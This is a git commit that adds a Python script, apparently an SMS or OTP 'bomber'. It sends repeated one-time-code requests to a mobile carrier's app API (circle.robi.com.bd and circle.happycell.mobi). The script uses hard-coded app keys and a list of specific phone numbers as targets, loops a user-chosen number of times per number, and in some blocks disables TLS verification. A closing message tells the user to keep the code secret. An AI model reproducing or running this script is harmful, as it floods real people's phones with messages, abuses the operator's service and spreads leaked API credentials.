2ce2efe3e8294bb672a6a3953ab3ca30b10bb7f5
Abir4566 <88508496+Abir4566@users.noreply.github.com>
2021-08-06 11:00:11 +0600

    Add files via upload

---
+++ Abir0185py.py
@@ -0,0 +1,196 @@
+import requests
+from requests.structures import CaseInsensitiveDict
+from time import*
+n=eval(input("Enter The Amount :"))
+its_frh = "https://circle.robi.com.bd/mylife/appapi/appcall.php"
+frh_bamboo = CaseInsensitiveDict()
+frh_bamboo["x-app-key"] = '000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg'
+frh_bamboo['Content-Type'] = "application/x-www-form-urlencoded"
+bash = "op=getOTC&pin=54374&msisdn=8801862862984&app_version=75"
+count=0
+for i in range(n):
+    resp = requests.post(its_frh, headers=frh_bamboo, data=bash)
+    
+    print(resp.content)
+    sleep(0.1)
+    count=count+1
+    print(count, "Sent Successful")
+import requests
+from requests.structures import CaseInsensitiveDict
+from time import*
+its_frh = "https://circle.robi.com.bd/mylife/appapi/appcall.php"
+frh_bamboo = CaseInsensitiveDict()
+frh_bamboo["x-app-key"] = '000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg'
+frh_bamboo['Content-Type'] = "application/x-www-form-urlencoded"
+bash = "op=getOTC&pin=54374&msisdn=8801875879289&app_version=75"
+count=0
+for i in range(n):
+    resp = requests.post(its_frh, headers=frh_bamboo, data=bash)
+    
+    print(resp.content)
+    sleep(0.1)
+    count=count+1
+    print(count, "Sent Successful")
+import requests
+from requests.structures import CaseInsensitiveDict
+from time import*
+its_frh = "https://circle.robi.com.bd/mylife/appapi/appcall.php"
+frh_bamboo = CaseInsensitiveDict()
+frh_bamboo["x-app-key"] = '000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg'
+frh_bamboo['Content-Type'] = "application/x-www-form-urlencoded"
+bash = "op=getOTC&pin=54374&msisdn=8801877256791&app_version=75"
+count=0
+for i in range(n):
+    resp = requests.post(its_frh, headers=frh_bamboo, data=bash)
+    
+    print(resp.content)
+    sleep(0.1)
+    count=count+1
+    print(count, "Sent Successful")
+import requests
+from requests.structures import CaseInsensitiveDict
+from time import*
+its_frh = "https://circle.robi.com.bd/mylife/appapi/appcall.php"
+frh_bamboo = CaseInsensitiveDict()
+frh_bamboo["x-app-key"] = '000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg'
+frh_bamboo['Content-Type'] = "application/x-www-form-urlencoded"
+bash = "op=getOTC&pin=54374&msisdn=8801892665795&app_version=75"
+count=0
+for i in range(n):
+    resp = requests.post(its_frh, headers=frh_bamboo, data=bash)
+    
+    print(resp.content)
+    sleep(0.1)
+    count=count+1
+    print(count, "Sent Successful")
+import requests
+from requests.structures import CaseInsensitiveDict
+from time import*
+its_frh = "https://circle.happycell.mobi/mylife/appapi/appcall.php"
+frh_bamboo = CaseInsensitiveDict()
+frh_bamboo['x-app-key'] = "0skgg0ksg4880840w8w4gco0k4wckw0cg0w0w88s"
+frh_bamboo["Content-Type"] = 'application/x-www-form-urlencoded'
+bash ={"op":'getOTC',"pin":'54374','msisdn':"8801920309884","app_version":"60"}
+count=0
+for i in range(n):
+    resp = requests.post(its_frh,headers=frh_bamboo, data=bash,verify=False)
+    
+    print(resp.content)
+    sleep(0.1)
+    count=count+1
+    print(count, "Sent Successful")
+import requests
+from requests.structures import CaseInsensitiveDict
+from time import*
+its_frh = "https://circle.happycell.mobi/mylife/appapi/appcall.php"
+frh_bamboo = CaseInsensitiveDict()
+frh_bamboo['x-app-key'] = "0skgg0ksg4880840w8w4gco0k4wckw0cg0w0w88s"
+frh_bamboo["Content-Type"] = 'application/x-www-form-urlencoded'
+bash ={"op":'getOTC',"pin":'54374','msisdn':"8801984559782","app_version":"60"}
+count=0
+for i in range(n):
+    resp = requests.post(its_frh,headers=frh_bamboo, data=bash,verify=False)
+    
+    print(resp.content)
+    sleep(0.1)
+    count=count+1
+    print(count, "Sent Successful")
+import requests
+from requests.structures import CaseInsensitiveDict
+from time import*
+its_frh = "https://circle.happycell.mobi/mylife/appapi/appcall.php"
+frh_bamboo = CaseInsensitiveDict()
+frh_bamboo['x-app-key'] = "0skgg0ksg4880840w8w4gco0k4wckw0cg0w0w88s"
+frh_bamboo["Content-Type"] = 'application/x-www-form-urlencoded'
+bash ={"op":'getOTC',"pin":'54374','msisdn':"8801925952192","app_version":"60"}
+count=0
+for i in range(n):
+    resp = requests.post(its_frh,headers=frh_bamboo, data=bash,verify=False)
+    
+    print(resp.content)
+    sleep(0.1)
+    count=count+1
+    print(count, "Sent Successful")
+import requests
+from requests.structures import CaseInsensitiveDict
+from time import*
+its_frh = "https://circle.robi.com.bd/mylife/appapi/appcall.php"
+frh_bamboo = CaseInsensitiveDict()
+frh_bamboo["x-app-key"] = '000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg'
+frh_bamboo['Content-Type'] = "application/x-www-form-urlencoded"
+bash = "op=getOTC&pin=54374&msisdn=8801844582459&app_version=75"
+count=0
+for i in range(n):
+    resp = requests.post(its_frh, headers=frh_bamboo, data=bash)
+    
+    print(resp.content)
+    sleep(0.1)
+    count=count+1
+    print(count, "Sent Successful")
+import requests
+from requests.structures import CaseInsensitiveDict
+from time import*
+its_frh = "https://circle.robi.com.bd/mylife/appapi/appcall.php"
+frh_bamboo = CaseInsensitiveDict()
+frh_bamboo["x-app-key"] = '000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg'
+frh_bamboo['Content-Type'] = "application/x-www-form-urlencoded"
+bash = "op=getOTC&pin=54374&msisdn=8801841601575&app_version=75"
+count=0
+for i in range(n):
+    resp = requests.post(its_frh, headers=frh_bamboo, data=bash)
+    
+    print(resp.content)
+    sleep(0.1)
+    count=count+1
+    print(count, "Sent Successful")
+import requests
+from requests.structures import CaseInsensitiveDict
+from time import*
+its_frh = "https://circle.robi.com.bd/mylife/appapi/appcall.php"
+frh_bamboo = CaseInsensitiveDict()
+frh_bamboo["x-app-key"] = '000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg'
+frh_bamboo['Content-Type'] = "application/x-www-form-urlencoded"
+bash = "op=getOTC&pin=54374&msisdn=8801810459332&app_version=75"
+count=0
+for i in range(n):
+    resp = requests.post(its_frh, headers=frh_bamboo, data=bash)
+    
+    print(resp.content)
+    sleep(0.1)
+    count=count+1
+    print(count, "Sent Successful")
+import requests
+from requests.structures import CaseInsensitiveDict
+from time import*
+its_frh = "https://circle.happycell.mobi/mylife/appapi/appcall.php"
+frh_bamboo = CaseInsensitiveDict()
+frh_bamboo['x-app-key'] = "0skgg0ksg4880840w8w4gco0k4wckw0cg0w0w88s"
+frh_bamboo["Content-Type"] = 'application/x-www-form-urlencoded'
+bash ={"op":'getOTC',"pin":'54374','msisdn':"8801932820135","app_version":"60"}
+count=0
+for i in range(n):
+    resp = requests.post(its_frh,headers=frh_bamboo, data=bash,verify=False)
+    
+    print(resp.content)
+    sleep(0.1)
+    count=count+1
+    print(count, "Sent Successful")
+import requests
+from requests.structures import CaseInsensitiveDict
+from time import*
+its_frh = "https://circle.robi.com.bd/mylife/appapi/appcall.php"
+frh_bamboo = CaseInsensitiveDict()
+frh_bamboo["x-app-key"] = '000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg'
+frh_bamboo['Content-Type'] = "application/x-www-form-urlencoded"
+bash = "op=getOTC&pin=54374&msisdn=8801877256791&app_version=75"
+count=0
+for i in range(n):
+    resp = requests.post(its_frh, headers=frh_bamboo, data=bash)
+    
+    print(resp.content)
+    sleep(0.1)
+    count=count+1
+    print(count, "Sent Successful")
+    
+    print("Author_Creator By Abir Warning:এই কোড যেন তুমি ছাড়া আর কারো কাছে কাছে না যায়!")
+    print("All Done! You Can Send Again!")
